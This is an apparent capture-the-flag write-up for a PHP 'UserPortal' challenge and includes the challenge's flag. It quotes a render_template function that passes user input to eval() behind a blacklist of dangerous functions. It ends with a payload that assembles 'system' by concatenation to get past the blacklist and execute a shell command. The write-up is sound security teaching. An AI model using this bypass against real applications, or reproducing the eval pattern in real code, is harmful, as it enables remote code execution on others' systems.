# Solution to UserPortal Challenge

**Category**: Web Exploitation  
**Flag**: `VSL{12e844403b1fb9c5b6705d8dd8823e4a}`

## Challenge Description

The **UserPortal** challenge presents a web application feature that allows users to render templates. Upon inspecting the source code, it becomes evident that the application uses the `eval()` function within the `render_template` method to process user-supplied templates. The primary objective is to achieve Remote Code Execution (RCE) despite the presence of a blacklist intended to block dangerous PHP functions.

## Source Code Analysis

The critical portion of the code resides in `src/includes/functions.php` within the `render_template` function:

```php
public static function render_template($template, $variables = [])
{
    $blacklist = [
        'system',
        'exec',
        'shell_exec',
        'passthru',
        'eval',
        'phpinfo',
        'assert',
        'create_function',
        'include',
        'require',
        'fopen',
        'fwrite',
        'file_put_contents',
        'file_get_contents',
    ];
    foreach ($blacklist as $badword) {
        if (stripos($template, $badword) !== false) {
            return "Error: Invalid input detected.";
        }
    }
    extract($variables);
    try {
        eval ("\$output = \"$template\";");
        return $output;
    } catch (ParseError $e) {
        return "Syntax Error: " . $e->getMessage();
    }
}
```
**Payload:** ```$s = 'sy' . 'stem'; $s('whoami'); //```